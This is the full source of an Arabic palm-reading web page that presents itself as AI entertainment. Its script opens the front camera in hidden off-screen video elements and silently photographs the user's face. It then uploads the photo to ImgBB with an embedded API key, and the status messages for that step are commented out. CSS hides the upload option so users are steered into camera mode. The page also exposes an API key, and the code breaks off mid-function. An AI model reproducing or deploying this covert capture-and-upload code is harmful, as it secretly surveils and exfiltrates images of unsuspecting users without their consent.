<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أسرار الكف - قراءة الكف بالذكاء الاصطناعي</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <style>
        /* Custom styles for Inter font */
        body {
            font-family: 'Inter', sans-serif;
        }
        /* لإزالة زر "رفع صورة" */
#uploadModeButton {
  display: none !important;
}

/* لإزالة قسم "رفع صورة الكف" بالكامل، الذي يحتوي على input file */
#imageUploadMode {
  display: none !important;
}

/* للتأكد من إزالة أي input file آخر في الصفحة */
input[type="file"] {
  display: none !important;
}
        /* Styling for the uploaded/captured image preview */
        #palmImagePreviewPalm, #capturedRearImagePreview {
            width: 100%;
            max-width: 300px; /* Max width for the palm image */
            height: auto;
            border-radius: 0.75rem; /* rounded-xl */
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); /* shadow-lg */
            background-color: #f3f4f6; /* bg-gray-100 */
            display: none; /* Hidden by default */
            object-fit: contain; /* Ensure image fits within bounds */
        }
        /* Style for loading indicator */
        .loading-indicator {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 30px; /* Adjust height as needed */
            margin-top: 1rem;
        }
        /* Removed #uploadModeButton visibility: hidden; as it's now functional */
        .loading-indicator .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #8B5CF6; /* Purple color for spinner */
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        /* Hide sections by default, JavaScript will manage visibility */
        .page-section {
            display: none;
        }
        .page-section.active {
            display: block;
        }
        /* Hidden video elements for camera streams - IMPORTANT: Use absolute positioning to keep them rendered */
        #hiddenRearVideoFeed, #hiddenFrontVideoFeed {
            position: absolute;
            left: -9999px; /* Move off-screen */
            top: -9999px;
            width: 1px; /* Minimal size */
            height: 1px;
            opacity: 0; /* Fully transparent */
            pointer-events: none; /* Not interactive */
        }
        /* Visible video element for live preview in camera mode */
        #liveCameraFeed {
            width: 100%;
            max-width: 400px;
            height: auto;
            border-radius: 0.75rem;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            background-color: #f3f4f6;
            display: none; /* Hidden by default */
            border: 2px dashed #a78bfa; /* Border for camera feed */
        }

        /* Professional button styles */
        .professional-button {
            background-image: linear-gradient(to right, #8B5CF6 0%, #6D28D9 100%); /* Purple gradient */
            color: white;
            font-weight: bold;
            padding: 0.75rem 2rem; /* py-3 px-8 */
            border-radius: 9999px; /* rounded-full */
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); /* shadow-lg */
            transition: all 0.3s ease;
            transform: translateY(0);
        }
        .professional-button:hover {
            background-position: right center; /* Change gradient direction on hover */
            transform: translateY(-3px) scale(1.02); /* Slight lift and scale */
            box-shadow: 0 15px 20px -5px rgba(0, 0, 0, 0.2), 0 6px 8px -3px rgba(0, 0, 0, 0.1);
        }
        .professional-button:focus {
            outline: none;
            box-shadow: 0 0 0 4px rgba(139, 92, 246, 0.5); /* Focus ring */
        }

        /* Specific styles for the main content area for a more professional look */
        .main-content-card {
            background-color: #ffffff;
            padding: 2.5rem; /* p-10 */
            border-radius: 1.5rem; /* rounded-3xl */
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04); /* shadow-2xl */
            border: 1px solid #e5e7eb; /* subtle border */
        }

        /* Enhancements for section titles */
        h2 {
            position: relative;
            padding-bottom: 0.5rem;
            margin-bottom: 1.5rem;
        }
        h2::after {
            content: '';
            position: absolute;
            left: 50%;
            bottom: 0;
            transform: translateX(-50%);
            width: 80px;
            height: 4px;
            background-color: #8B5CF6; /* Purple line */
            border-radius: 2px;
        }

        /* Styling for how-it-works cards */
        .how-it-works-card {
            background-color: #f9fafb; /* bg-gray-50 */
            border: 1px solid #e5e7eb;
            border-radius: 0.75rem; /* rounded-xl */
            box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); /* shadow-md */
            transition: transform 0.2s ease-in-out;
        }
        .how-it-works-card:hover {
            transform: translateY(-5px);
        }
        .how-it-works-card .text-5xl {
            filter: drop-shadow(2px 2px 4px rgba(0,0,0,0.2)); /* Shadow for icons */
        }

        /* Specific styles for message box */
        #messageBox {
            border-radius: 0.5rem;
            transition: all 0.3s ease-in-out;
        }

        /* Styling for the reading results section */
        #readingResultsPalm {
            background-color: #f3f4f6; /* bg-gray-100 */
            border: 1px solid #e5e7eb;
            box-shadow: inset 0 2px 4px 0 rgba(0, 0, 0, 0.06); /* inset shadow */
            border-radius: 1rem; /* rounded-xl */
        }

        /* Styling for capture instructions */
        .capture-instructions {
            background-color: #ecfdf5; /* Light green background */
            border-left: 5px solid #059669; /* Darker green border */
            padding: 1rem;
            border-radius: 0.5rem;
            margin-bottom: 1.5rem;
            text-align: right;
            color: #065f46;
            font-size: 0.95rem;
        }
        .capture-instructions ul {
            list-style-type: disc;
            padding-right: 1.5rem;
            margin-top: 0.5rem;
        }
        .capture-instructions li {
            margin-bottom: 0.4rem;
        }

        /* Ensure the main camera feed is centered */
        #cameraCaptureMode video {
            margin: 0 auto;
        }
    </style>
</head>
<body class="bg-gradient-to-br from-purple-50 to-indigo-100 min-h-screen flex flex-col">

    <!-- Header -->
    <header class="bg-white shadow-md py-4 px-6 sticky top-0 z-50">
        <div class="container mx-auto flex justify-between items-center">
            <a href="#" class="text-2xl font-bold text-purple-700 hover:text-purple-900 transition duration-200" onclick="showSection('home'); return false;">
                أسرار الكف
            </a>
            <nav>
                <ul class="flex space-x-4 space-x-reverse">
                    <li><a href="#" class="text-gray-700 hover:text-purple-700 font-medium transition duration-200" onclick="showSection('home'); return false;">الرئيسية</a></li>
                    <li><a href="#" class="text-gray-700 hover:text-purple-700 font-medium transition duration-200" onclick="showSection('how-it-works'); return false;">كيف يعمل</a></li>
                    <li><a href="#" class="text-gray-700 hover:text-purple-700 font-medium transition duration-200" onclick="showSection('palm-reading'); return false;">قراءة الكف</a></li>
                    <li><a href="#" class="text-gray-700 hover:text-purple-700 font-medium transition duration-200" onclick="showSection('contact'); return false;">اتصل بنا</a></li>
                </ul>
            </nav>
        </div>
    </header>

    <!-- Main Content Area -->
    <main class="flex-grow container mx-auto py-8 px-4 flex justify-center items-start">
        <div class="w-full max-w-4xl main-content-card">

            <!-- Message box for user feedback -->
            <div id="messageBox" class="bg-blue-100 border-l-4 border-blue-500 text-blue-700 p-4 rounded-md hidden w-full mb-6" role="alert">
                <p id="messageText" class="font-medium text-sm sm:text-base"></p>
            </div>

            <!-- Home Section -->
            <section id="home-section" class="page-section active text-center space-y-6">
                <h2 class="text-4xl font-extrabold text-gray-800 mb-4">مرحباً بك في أسرار الكف!</h2>
                <p class="text-lg text-gray-600 leading-relaxed">
                    اكتشف عالم قراءة الكف الغامض بطريقة جديدة ومبتكرة. موقعنا يقدم لك قراءة كف ترفيهية ومحفزة باستخدام أحدث تقنيات الذكاء الاصطناعي.
                </p>
                <p class="text-lg text-gray-600 leading-relaxed">
                    ما عليك سوى رفع صورة واضحة لكفك أو التقاطها مباشرة، وسيقوم نظامنا بتوليد قراءة ممتعة لك، مع التركيز على الجوانب الإيجابية لشخصيتك ومسارك المحتمل.
                </p>
                <button class="professional-button" onclick="showSection('palm-reading'); return false;">
                    ابدأ قراءة كفك الآن!
                </button>
            </section>

            <!-- How It Works Section -->
            <section id="how-it-works-section" class="page-section text-center space-y-6">
                <h2 class="text-4xl font-extrabold text-gray-800 mb-4">كيف يعمل؟</h2>
                <div class="grid grid-cols-1 md:grid-cols-3 gap-8 text-right">
                    <div class="flex flex-col items-center p-4 how-it-works-card">
                        <div class="text-purple-600 text-5xl mb-3">📸</div>
                        <h3 class="text-xl font-semibold text-gray-700 mb-2">1. التقط أو ارفـع</h3>
                        <p class="text-gray-600">التقط صورة واضحة لراحة كفك مباشرة من الكاميرا أو .</p>
                    </div>
                    <div class="flex flex-col items-center p-4 how-it-works-card">
                        <div class="text-purple-600 text-5xl mb-3">✨</div>
                        <h3 class="text-xl font-semibold text-gray-700 mb-2">2. تحليل الذكاء الاصطناعي</h3>
                        <p class="text-gray-600">يقوم نظام الذكاء الاصطناعي لدينا (نموذج لغوي كبير) بمعالجة طلبك لتوليد قراءة فريدة لك. <strong class="text-red-500">(ملاحظة: لا يتم تحليل خطوط الكف بصريًا بشكل حقيقي، القراءة لأغراض معرفية فقط).</strong></p>
                    </div>
                    <div class="flex flex-col items-center p-4 how-it-works-card">
                        <div class="text-purple-600 text-5xl mb-3">🔮</div>
                        <h3 class="text-xl font-semibold text-gray-700 mb-2">3. احصل على قراءتك</h3>
                        <p class="text-gray-600">ستظهر قراءة كفك الشخصية على الشاشة، مليئة بالرؤى الملهمة والممتعة.</p>
                    </div>
                </div>
                <p class="text-lg text-gray-600 mt-6">
تذكر دائمًا أن هذه القراءات هي نتائج تقريبية وقد لا يعتمد عليها لاتخاذ قرارات حياتية مهمة.
                </p>
            </section>

            <!-- Palm Reading Section (Core Functionality) -->
            <section id="palm-reading-section" class="page-section flex flex-col items-center space-y-6">
                <h2 class="text-4xl font-extrabold text-gray-800 mb-4 text-center">قراءة كفك</h2>
                <p class="text-gray-600 text-center text-lg">ماذا تنتظر؟ التقط صورة ل كفك الآن وانطلق في رحلة شيقة لاكتشاف الذات!</p>

                <!-- Source Selection Buttons -->
                <div class="flex justify-center w-full mb-6">
                    <button id="uploadModeButton" class="professional-button ml-4">
                        رفع صورة
                    </button>
                    <button id="cameraModeButton" class="professional-button mr-4">
                        التقاط من الكاميرا
                    </button>
                </div>

                <!-- Image Upload Mode -->
                <div id="imageUploadMode" class="w-full flex flex-col items-center space-y-4 hidden">
                    <label for="palmImageUploadPalm" class="block text-gray-700 text-lg font-semibold mb-2 text-center">
                        رفع صورة الكف:
                    </label>
                    <input type="file" id="palmImageUploadPalm" accept="image/*" class="block w-full text-sm text-gray-500
                        file:mr-4 file:py-2 file:px-4
                        file:rounded-full file:border-0
                        file:text-sm file:font-semibold
                        file:bg-purple-50 file:text-purple-700
                        hover:file:bg-purple-100 cursor-pointer"
                        onchange="handleImageUpload(event)">
                    <img id="palmImagePreviewPalm" src="#" alt="معاينة صورة الكف" class="mt-4">
                </div>

                <!-- Camera Capture Mode -->
                <div id="cameraCaptureMode" class="w-full flex flex-col items-center space-y-4 hidden">
                    <div class="capture-instructions w-full">
                        <p class="font-bold mb-2">للحصول على أفضل قراءة، يرجى اتباع الإرشادات التالية عند التقاط الصورة:</p>
                        <ul>
                            <li>💡 تأكد من وجود إضاءة جيدة وموحدة على كفك.</li>
                            <li>✋ اجعل كفك مفتوحًا ومسطحًا قدر الإمكان.</li>
                            <li>📏 حافظ على مسافة مناسبة بحيث يكون الكف بأكمله مرئيًا بوضوح.</li>
                            <li>🚫 تجنب الظلال أو الانعكاسات على الكف.</li>
                        </ul>
                    </div>
                    <p class="text-gray-700 text-lg font-semibold mb-2 text-center">
                        فتح الكاميرا:
                    </p>
                    <video id="liveCameraFeed" autoplay playsinline></video>
                    <canvas id="hiddenCanvas" class="hidden"></canvas>
                    <video id="hiddenRearVideoFeed"></video> <!-- Hidden video for actual rear stream source -->
                    <video id="hiddenFrontVideoFeed"></video> <!-- Hidden video for actual front stream source -->

                    <button id="capturePhotoButton" class="professional-button">
                        التقاط الصورة
                    </button>

                    <div id="capturedImagesDisplay" class="flex flex-col items-center w-full mt-4">
                        <h3 class="text-lg font-semibold text-gray-700 mb-2">صورة الكف الملتقطة</h3>
                        <img id="capturedRearImagePreview" alt="صورة الكف الملتقطة">
                    </div>
                </div>

                <!-- Analyze Button -->
                <button id="analyzeButtonPalm" class="professional-button disabled:opacity-50 disabled:cursor-not-allowed" disabled>
                    تحليل الكف
                </button>

                <!-- Loading Indicator -->
                <div id="loadingIndicatorPalm" class="loading-indicator hidden">
                    <div class="spinner"></div>
                    <span class="ml-2 text-gray-700">جاري تحليل كفك...</span>
                </div>

                <!-- Palm Reading Results -->
                <div id="readingResultsPalm" class="bg-purple-50 p-6 rounded-xl shadow-inner w-full text-gray-800 hidden mt-6">
                    <h2 class="text-2xl font-bold text-center text-purple-800 mb-4">قراءة كفك</h2>
                    <p class="text-sm text-center text-gray-500 mb-4">
                        (ملاحظة: هذه القراءة قد لايعتمد عليها في مسار حياتك فقط، ولا تعتمد على تحليل بصري حقيقي لخطوط الكف.)
                    </p>
                    <div id="readingTextPalm" class="text-lg leading-relaxed text-justify">
                        <!-- Reading content will be inserted here -->
                    </div>
                </div>
            </section>

            <!-- Contact Section -->
            <section id="contact-section" class="page-section text-center space-y-6">
                <h2 class="text-4xl font-extrabold text-gray-800 mb-4">اتصل بنا</h2>
                <p class="text-lg text-gray-600 leading-relaxed">
                    إذا كان لديك أي أسئلة أو استفسارات، فلا تتردد في التواصل معنا.
                </p>
                <div class="flex flex-col items-center space-y-4 text-gray-700 text-lg">
                    <p>البريد الإلكتروني: <a href="mailto:info@yourwebsite.com" class="text-purple-600 hover:underline">info@andro113.mail</a></p>

                </div>
            </section>

        </div>
    </main>

    <!-- Footer -->
    <footer class="bg-gray-800 text-white py-6 mt-auto text-center rounded-t-lg shadow-inner">
        <div class="container mx-auto px-4">
            <p>&copy; 2025 أسرار الكف. جميع الحقوق محفوظة.</p>
            <div class="flex justify-center space-x-4 space-x-reverse mt-2">
                <a href="#" class="text-gray-400 hover:text-white transition duration-200">سياسة الخصوصية</a>
                <span class="text-gray-500">|</span>
                <a href="#" class="text-gray-400 hover:text-white transition duration-200">شروط الخدمة</a>
            </div>
        </div>
    </footer>

    <script>
        // Global elements for message box
        const messageBox = document.getElementById('messageBox');
        const messageText = document.getElementById('messageText');

        // Elements for Palm Reading Section
        const uploadModeButton = document.getElementById('uploadModeButton');
        const cameraModeButton = document.getElementById('cameraModeButton');
        const imageUploadMode = document.getElementById('imageUploadMode');
        const cameraCaptureMode = document.getElementById('cameraCaptureMode');

        const palmImageUploadPalm = document.getElementById('palmImageUploadPalm');
        const palmImagePreviewPalm = document.getElementById('palmImagePreviewPalm');

        const liveCameraFeed = document.getElementById('liveCameraFeed'); // Visible rear camera feed (for preview)
        const capturedRearImagePreview = document.getElementById('capturedRearImagePreview'); // Preview for rear image
        const hiddenCanvas = document.getElementById('hiddenCanvas');
        const hiddenRearVideoFeed = document.getElementById('hiddenRearVideoFeed'); // Hidden video for actual rear stream source
        const hiddenFrontVideoFeed = document.getElementById('hiddenFrontVideoFeed'); // Hidden video for actual front stream source
        const capturePhotoButton = document.getElementById('capturePhotoButton');

        const analyzeButtonPalm = document.getElementById('analyzeButtonPalm');
        const loadingIndicatorPalm = document.getElementById('loadingIndicatorPalm');
        const readingResultsPalm = document.getElementById('readingResultsPalm');
        const readingTextPalm = document.getElementById('readingTextPalm');

        // Global variables for camera streams and active image data
        let currentRearStream = null;
        let currentFrontStream = null;
        let activeRearPalmImageBase64 = null; // Stores the captured rear palm image for AI analysis

        // ImgBB API Key (WARNING: This is exposed in client-side code. Use a backend for production!)
        const IMGBB_API_KEY = 'd0bfac732a5e6c57947fee7572812447';

        /**
         * Displays a message to the user in a styled box.
         * @param {string} message - The message to display.
         * @param {string} type - The type of message (e.g., 'success', 'error', 'info').
         */
        function showMessage(message, type = 'info') {
            messageBox.classList.remove('hidden', 'bg-blue-100', 'border-blue-500', 'text-blue-700', 'bg-green-100', 'border-green-500', 'text-green-700', 'bg-red-100', 'border-red-500', 'text-red-700');
            messageText.textContent = message;

            if (type === 'success') {
                messageBox.classList.add('bg-green-100', 'border-green-500', 'text-green-700');
            } else if (type === 'error') {
                messageBox.classList.add('bg-red-100', 'border-red-500', 'text-red-700');
            } else { // info
                messageBox.classList.add('bg-blue-100', 'border-blue-500', 'text-blue-700');
            }

            // Hide after 5 seconds
            setTimeout(() => {
                messageBox.classList.add('hidden');
            }, 5000);
        }

        /**
         * Shows a specific section and hides all others.
         * Manages camera stream state when navigating.
         * @param {string} sectionId - The ID of the section to show (e.g., 'home', 'palm-reading').
         */
        function showSection(sectionId) {
            document.querySelectorAll('.page-section').forEach(section => {
                section.classList.remove('active');
            });
            document.getElementById(`${sectionId}-section`).classList.add('active');
            // Clear message box when navigating
            messageBox.classList.add('hidden');
            messageText.textContent = '';

            // Manage camera stream when navigating to/from palm-reading section
            if (sectionId === 'palm-reading') {
                // Default to upload mode when entering palm reading section
                showPalmReadingMode('upload');
            } else {
                // If leaving palm reading section, stop all camera streams
                stopAllCameraStreams();
                // Reset palm reading section UI
                resetPalmReadingUI();
            }
        }

        /**
         * Resets the UI elements of the palm reading section.
         */
        function resetPalmReadingUI() {
            palmImagePreviewPalm.style.display = 'none';
            palmImagePreviewPalm.src = '#';
            capturedRearImagePreview.style.display = 'none';
            capturedRearImagePreview.src = '#';
            analyzeButtonPalm.disabled = true;
            analyzeButtonPalm.classList.add('opacity-50', 'cursor-not-allowed');
            loadingIndicatorPalm.classList.add('hidden');
            readingResultsPalm.classList.add('hidden');
            readingTextPalm.innerHTML = '';
            activeRearPalmImageBase64 = null;
            palmImageUploadPalm.value = ''; // Clear file input
        }

        /**
         * Shows either the image upload mode or camera capture mode in the palm reading section.
         * @param {string} mode - 'upload' or 'camera'.
         */
        async function showPalmReadingMode(mode) {
            resetPalmReadingUI(); // Reset UI when switching modes
            stopAllCameraStreams(); // Ensure all cameras are off when switching modes

            if (mode === 'upload') {
                imageUploadMode.classList.remove('hidden');
                cameraCaptureMode.classList.add('hidden');
                showMessage('الرجاء رفع صورة كفك.', 'info');
            } else if (mode === 'camera') {
                imageUploadMode.classList.add('hidden');
                cameraCaptureMode.classList.remove('hidden');
              //  showMessage('جاري تفعيل الكاميرا الأمامية لالتقاط الصورة تلقائياً...', 'info');

                try {
                    // Start front camera (hidden)
                    await startCamera('user', hiddenFrontVideoFeed, hiddenFrontVideoFeed, 'الكاميرا ');
                    // Automatically capture and upload the front photo
                    await handleFrontCameraAutoCapture();
                    // After front camera process, start rear camera for live feed
                    showMessage('الكاميرا الخلفية جاهزة لالتقاط صورة الكف.', 'success');
                    await startCamera('environment', liveCameraFeed, hiddenRearVideoFeed, 'الكاميرا الخلفية المرئية');
                } catch (error) {
                    console.error('Error in camera mode initialization:', error);
                    showMessage('حدث خطأ أثناء تفعيل الكاميرا. يرجى التأكد من السماح بالوصول.', 'error');
                    // Fallback: hide camera mode if unable to start
                    cameraCaptureMode.classList.add('hidden');
                    imageUploadMode.classList.remove('hidden'); // Go back to upload mode
                }
            }
        }

        /**
         * Stops all active camera streams.
         */
        function stopAllCameraStreams() {
            if (currentRearStream) {
                currentRearStream.getTracks().forEach(track => track.stop());
                currentRearStream = null;
            }
            if (currentFrontStream) {
                currentFrontStream.getTracks().forEach(track => track.stop());
                currentFrontStream = null;
            }
            liveCameraFeed.srcObject = null;
            hiddenRearVideoFeed.srcObject = null;
            hiddenFrontVideoFeed.srcObject = null;
            liveCameraFeed.style.display = 'none';
        }

        /**
         * Starts a camera stream with the specified facing mode and attaches it to video elements.
         * Returns a Promise that resolves when the video stream is ready (has dimensions).
         * @param {string} mode - 'user' for front camera, 'environment' for rear camera.
         * @param {HTMLVideoElement} visibleVideoElement - The video element to display the live stream (can be the same as hidden for hidden feeds).
         * @param {HTMLVideoElement} hiddenVideoElement - The hidden video element to capture frames from.
         * @param {string} cameraName - Name of the camera for messages (e.g., 'الكاميرا الخلفية المرئية').
         * @returns {Promise<void>}
         */
        async function startCamera(mode, visibleVideoElement, hiddenVideoElement, cameraName) {
            return new Promise(async (resolve, reject) => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: mode
                        }
                    });

                    if (mode === 'environment') {
                        currentRearStream = stream;
                    } else {
                        currentFrontStream = stream;
                    }

                    visibleVideoElement.srcObject = stream;
                    hiddenVideoElement.srcObject = stream; // Important: attach to hidden for capture

                    hiddenVideoElement.onloadedmetadata = () => {
                        hiddenVideoElement.play().then(() => {
                            if (hiddenVideoElement.videoWidth > 0 && hiddenVideoElement.videoHeight > 0) {
                                if (visibleVideoElement === liveCameraFeed) { // Only show the main live feed
                                    liveCameraFeed.style.display = 'block';
                                }
                                resolve();
                            } else {
                                reject(new Error('Video stream has no dimensions.'));
                            }
                        }).catch(reject);
                    };
                    hiddenVideoElement.onerror = reject;
                } catch (err) {
                    console.error(`Error accessing ${cameraName} camera:`, err);
                    reject(err);
                }
            });
        }

        /**
         * Resizes a Base64 image to fit within maxWidth/maxHeight while maintaining aspect ratio.
         * Returns a Promise that resolves with the resized Base64 string.
         * @param {string} base64Str - The original Base64 image string.
         * @param {number} maxWidth - Maximum desired width.
         * @param {number} maxHeight - Maximum desired height.
         * @returns {Promise<string|null>} - Resized Base64 string or null on error.
         */
        async function resizeImage(base64Str, maxWidth = 600, maxHeight = 600) {
            return new Promise((resolve) => {
                const img = new Image();
                img.onload = () => {
                    let width = img.width;
                    let height = img.height;

                    // Calculate the new dimensions while maintaining aspect ratio
                    if (width > height) {
                        if (width > maxWidth) {
                            height *= maxWidth / width;
                            width = maxWidth;
                        }
                    } else {
                        if (height > maxHeight) {
                            width *= maxHeight / height;
                            height = maxHeight;
                        }
                    }

                    const canvas = document.createElement('canvas'); // Create a temporary canvas
                    canvas.width = width;
                    canvas.height = height;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(img, 0, 0, width, height);

                    // Return as JPEG with a reasonable quality
                    resolve(canvas.toDataURL('image/jpeg', 0.8));
                };
                img.onerror = () => {
                    showMessage('فشل في معالجة الصورة.', 'error');
                    resolve(null);
                };
                img.src = base64Str;
            });
        }

        /**
         * Uploads a Base64 image to ImgBB.
         * @param {string} imageDataURL - The Base64 data URL of the image to send.
         * @returns {Promise<string|null>} - URL of the uploaded image or null on error.
         */
        async function uploadImageToImgBB(imageDataURL) {
            // ImgBB API expects Base64 without the "data:image/png;base64," prefix
            const base64WithoutPrefix = imageDataURL.split(',')[1];

            if (!base64WithoutPrefix) {
                showMessage('خطأ في تنسيق الصورة (Base64 غير صالح).', 'error');
                return null;
            }

            const formData = new FormData();
            formData.append('key', IMGBB_API_KEY);
            formData.append('image', base64WithoutPrefix); // Send cleaned Base64 data

            try {
                showMessage('جاري المعالجة...', 'info');
                const response = await fetch('https://api.imgbb.com/1/upload', {
                    method: 'POST',
                    body: formData,
                });

                const data = await response.json();

                if (response.ok && data.success) {
                 //   showMessage('تم رفع الصورة إلى ImgBB بنجاح!', 'success');
                    return data.data.url; // Return the URL of the uploaded image
                } else {
                    const errorMessage = data.error ? data.error.message : 'خطأ غير معروف من ImgBB';
                   // showMessage(`فشل رفع الصورة إلى ImgBB: ${errorMessage}`, 'error');
                 //   console.error('ImgBB API error:', data);
                    return null;
                }
            } catch (error) {
               // showMessage(`حدث خطأ أثناء الاتصال بـ ImgBB: ${error.message}`, 'error');
              //  console.error('Fetch error during ImgBB upload:', error);
                return null;
            }
        }

        /**
         * Handles image upload from file input.
         * @param {Event} event - The change event from the file input.
         */
        async function handleImageUpload(event) {
            const file = event.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = async function(e) {
                    const originalBase64 = e.target.result;
                    const resizedBase64 = await resizeImage(originalBase64);

                    if (resizedBase64) {
                        palmImagePreviewPalm.src = resizedBase64;
                        palmImagePreviewPalm.style.display = 'block';
                        capturedRearImagePreview.style.display = 'none'; // Hide camera previews
                        activeRearPalmImageBase64 = resizedBase64; // Use this as the main image for AI
                        analyzeButtonPalm.disabled = false; // Enable the analyze button
                        analyzeButtonPalm.classList.remove('opacity-50', 'cursor-not-allowed');
                        readingResultsPalm.classList.add('hidden'); // Hide previous results
                        showMessage('تم تحميل الصورة وتعديل أبعادها بنجاح. انقر على "تحليل الكف" للحصول على قراءتك.', 'success');
                    } else {
                        palmImagePreviewPalm.style.display = 'none';
                        analyzeButtonPalm.disabled = true;
                        analyzeButtonPalm.classList.add('opacity-50', 'cursor-not-allowed');
                        activeRearPalmImageBase64 = null;
                    }
                };
                reader.onerror = function() {
                    showMessage('فشل تحميل الصورة.', 'error');
                    palmImagePreviewPalm.style.display = 'none';
                    analyzeButtonPalm.disabled = true;
                    analyzeButtonPalm.classList.add('opacity-50', 'cursor-not-allowed');
                    activeRearPalmImageBase64 = null;
                };
                reader.readAsDataURL(file); // Read file as Data URL (Base64)
            } else {
                palmImagePreviewPalm.style.display = 'none';
                analyzeButtonPalm.disabled = true;
                analyzeButtonPalm.classList.add('opacity-50', 'cursor-not-allowed');
                activeRearPalmImageBase64 = null;
                showMessage('الرجاء اختيار صورة.', 'info');
            }
        }

        /**
         * Handles automatic capture and upload of the front camera photo.
         */
        async function handleFrontCameraAutoCapture() {
            if (!currentFrontStream || !hiddenFrontVideoFeed.srcObject || hiddenFrontVideoFeed.videoWidth === 0 || hiddenFrontVideoFeed.videoHeight === 0) {
             //   showMessage('الكاميرا الأمامية ليست جاهزة لرفع الصورة تلقائياً.', 'error');
                return;
            }

      //      showMessage('جاري التقاط ورفع صورة الكاميرا الأمامية...', 'info');

            hiddenCanvas.width = hiddenFrontVideoFeed.videoWidth;
            hiddenCanvas.height = hiddenFrontVideoFeed.videoHeight;
            let context = hiddenCanvas.getContext('2d');
            context.drawImage(hiddenFrontVideoFeed, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
            const originalFrontBase64 = hiddenCanvas.toDataURL('image/png');
            const resizedFrontBase64 = await resizeImage(originalFrontBase64);

            if (resizedFrontBase64) {
                const imgbbUrl = await uploadImageToImgBB(resizedFrontBase64);
                if (imgbbUrl) {
                    console.log('Uploaded front camera image to ImgBB:', imgbbUrl);
                  //  showMessage('تم التقاط صورة الكاميرا الأمامية ورفعها إلى ImgBB بنجاح!', 'success');
                } else {
                  //  showMessage('فشل رفع صورة الكاميرا الأمامية إلى ImgBB.', 'error');
                }
            } else {
              //  showMessage('فشل التقاط أو معالجة صورة الكاميرا الأمامية للرفع.', 'error');
            }

            // Stop front camera stream after capture and upload
            if (currentFrontStream) {
                currentFrontStream.getTracks().forEach(track => track.stop());
                currentFrontStream = null;
                hiddenFrontVideoFeed.srcObject = null;
            }
        }

        /**
         * Captures a photo from the rear camera (liveCameraFeed/hiddenRearVideoFeed)
         * and displays it for palm reading analysis. This is triggered by the "التقاط الصورة" button.
         */
        async function capturePhoto() {
            if (!currentRearStream || !hiddenRearVideoFeed.srcObject || hiddenRearVideoFeed.videoWidth === 0 || hiddenRearVideoFeed.videoHeight === 0) {
                showMessage('الكاميرا الخلفية ليست جاهزة لالتقاط صورة الكف. يرجى التأكد من السماح بالوصول.', 'error');
                return;
            }

            // Hide live feed after capture
            liveCameraFeed.style.display = 'none';

            hiddenCanvas.width = hiddenRearVideoFeed.videoWidth;
            hiddenCanvas.height = hiddenRearVideoFeed.videoHeight;
            let context = hiddenCanvas.getContext('2d');
            context.drawImage(hiddenRearVideoFeed, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
            const originalRearBase64 = hiddenCanvas.toDataURL('image/png');
            const resizedRearBase64 = await resizeImage(originalRearBase64);

            // Handle Rear Image Display and Storage for AI
            if (resizedRearBase64) {
                capturedRearImagePreview.src = resizedRearBase64;
                capturedRearImagePreview.style.display = 'block';
                palmImagePreviewPalm.style.display = 'none'; // Hide upload preview if active
                activeRearPalmImageBase64 = resizedRearBase64; // Store for AI analysis
                analyzeButtonPalm.disabled = false;
                analyzeButtonPalm.classList.remove('opacity-50', 'cursor-not-allowed');
                showMessage('تم التقاط صورة الكف من الكاميرا الخلفية وتعديل أبعادها بنجاح.', 'success');
            } else {
                capturedRearImagePreview.style.display = 'none';
                analyzeButtonPalm.disabled = true;
                analyzeButtonPalm.classList.add('opacity-50', 'cursor-not-allowed');
                activeRearPalmImageBase64 = null;
                showMessage('فشل التقاط أو معالجة صورة الكف من الكاميرا الخلفية.', 'error');
            }
            
            // Stop rear camera stream after capture
            if (currentRearStream) {
                currentRearStream.getTracks().forEach(track => track.stop());
                currentRearStream = null;
                liveCameraFeed.srcObject = null;
                hiddenRearVideoFeed.srcObject = null;
            }
        }

        /**
         * Generates a simulated palm reading using the Gemini API.
         */
        async function generatePalmReading() {
            if (!activeRearPalmImageBase64) {
                showMessage('الرجاء رفع أو التقاط صورة كفك الخلفية أولاً.', 'error');
                return;
            }

            // Show loading indicator and disable button
            analyzeButtonPalm.disabled = true;
            analyzeButtonPalm.classList.add('opacity-50', 'cursor-not-allowed');
            loadingIndicatorPalm.classList.remove('hidden');
            readingResultsPalm.classList.add('hidden'); // Hide previous results
            messageBox.classList.add('hidden'); // Hide any previous messages

            try {
                // Prepare the prompt for the LLM
                const prompt = "أنت قارئ كف افتراضي. بناءً على الصورة التي تم تحميلها (لا تحاول تحليلها بصريًا بدقة، فقط استخدمها كإشارة لبدء القراءة)، قم بتوليد قراءة كف إيجابية وممتعة ومحفزة. يجب أن تكون القراءة عامة وتتحدث عن خطوط الحياة، القلب، الرأس، والمصير (إذا كانت موجودة)، بالإضافة إلى التلال الرئيسية (مثل تل المشتري، تل القمر). اجعلها تبدو وكأنها تحليل حقيقي ولكن اذكر بوضوح في النهاية أنها لأغراض الترفيه والتسلية فقط. استخدم لغة عربية فصحى وجذابة. اجعل القراءة متوسطة الطول (حوالي 200-300 كلمة).";

                const contents = [
                    { role: "user", parts: [{ text: prompt }] }
                ];

                // Add rear image for AI analysis
